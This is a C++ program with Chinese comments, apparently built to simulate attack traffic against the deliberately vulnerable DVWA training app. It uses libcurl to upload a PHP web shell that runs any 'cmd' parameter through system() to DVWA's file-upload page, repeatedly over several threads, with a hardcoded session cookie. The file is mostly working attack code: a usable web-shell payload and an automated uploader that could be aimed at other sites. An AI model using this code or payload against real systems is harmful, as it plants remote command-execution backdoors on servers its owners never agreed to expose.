/*
 * DVWA Backdoor/File Upload Attack Simulator
 * Simulation: Mimics uploading a PHP backdoor (Remot3d style payload) to DVWA
 * Dependency: libcurl
 * Compile: g++ backdoor_upload_flood.cpp -o backdoor_upload_flood -lcurl -lpthread
 */

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <curl/curl.h>

// === 配置区域 ===
// 1. DVWA 上传漏洞页面的 URL
const std::string UPLOAD_URL = "http://192.168.0.230/dvwa/vulnerabilities/upload/";
// 2. 您的 Session ID (必须登录)
const std::string SESSION_ID = "d30osh0d51m82tpbjplcg10kgp"; 
const std::string SECURITY_LEVEL = "low"; // 上传漏洞在 Low 级别最容易触发

// 3. 模拟的恶意 PHP 后门代码 (类似于 Remot3d 生成的简单 Web Shell)
const std::string BACKDOOR_CONTENT = "<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>";
const std::string FILENAME = "remot3d_backdoor.php";

const int THREAD_COUNT = 5;
const int ATTACK_DURATION = 60; 

// === 全局控制 ===
std::atomic<bool> is_running(true);
std::atomic<long> total_uploads(0);

size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp) {
    return size * nmemb;
}

void attack_worker(int thread_id) {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    std::string cookie_str = "security=" + SECURITY_LEVEL + "; PHPSESSID=" + SESSION_ID;
    
    // 设置基础选项
    curl_easy_setopt(curl, CURLOPT_COOKIE, cookie_str.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "CPP-Backdoor-Uploader/1.0");
    curl_easy_setopt(curl, CURLOPT_URL, UPLOAD_URL.c_str());

    while (is_running) {
        // === 关键：构造 multipart/form-data 表单 ===
        curl_mime *mime;
        curl_mimepart *part;

        mime = curl_mime_init(curl);

        // 1. 添加文件部分 (name="uploaded")
        // DVWA 的上传表单字段名通常是 'uploaded'
        part = curl_mime_addpart(mime);
        curl_mime_name(part, "uploaded");
        // 这里直接从内存发送数据，不需要本地真有这个文件
        curl_mime_data(part, BACKDOOR_CONTENT.c_str(), CURL_ZERO_TERMINATED); 
        curl_mime_filename(part, FILENAME.c_str()); // 伪装文件名
        curl_mime_type(part, "application/x-php");  // 伪装 MIME 类型

        // 2. 添加提交按钮部分 (name="Upload")
        // 必须包含这个，否则 DVWA 后端可能不处理
        part = curl_mime_addpart(mime);
        curl_mime_name(part, "Upload");
        curl_mime_data(part, "Upload", CURL_ZERO_TERMINATED);

        // 3. 绑定 MIME 表单到请求
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

        // 4. 发送请求
        CURLcode res = curl_easy_perform(curl);

        if (res == CURLE_OK) {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            // DVWA 上传成功通常返回 200，并包含 "successfully uploaded" 字样
            if(response_code == 200) {
                total_uploads++;
            }
        }

        // 清理 MIME 对象 (必须在每次循环中清理并重新创建，或者在循环外创建一次重复使用)
        curl_mime_free(mime);
        
        // 稍微休眠，上传操作比较重
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    
    curl_easy_cleanup(curl);
}

int main() {
    curl_global_init(CURL_GLOBAL_ALL);

    std::cout << "=== Backdoor Malware Traffic Sim Started ===" << std::endl;
    std::cout << "Target: " << UPLOAD_URL << std::endl;
    std::cout << "Payload: " << FILENAME << " (Virtual In-Memory)" << std::endl;

    std::vector<std::thread> threads;
    for (int i = 0; i < THREAD_COUNT; ++i) {
        threads.emplace_back(attack_worker, i + 1);
    }

    std::this_thread::sleep_for(std::chrono::seconds(ATTACK_DURATION));
    is_running = false;

    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }

    std::cout << "\n=== Finished ===" << std::endl;
    std::cout << "Total Files Uploaded: " << total_uploads.load() << std::endl;
    std::cout << "Avg RPS:              " << (total_uploads.load() / ATTACK_DURATION) << std::endl;

    curl_global_cleanup();
    return 0;
}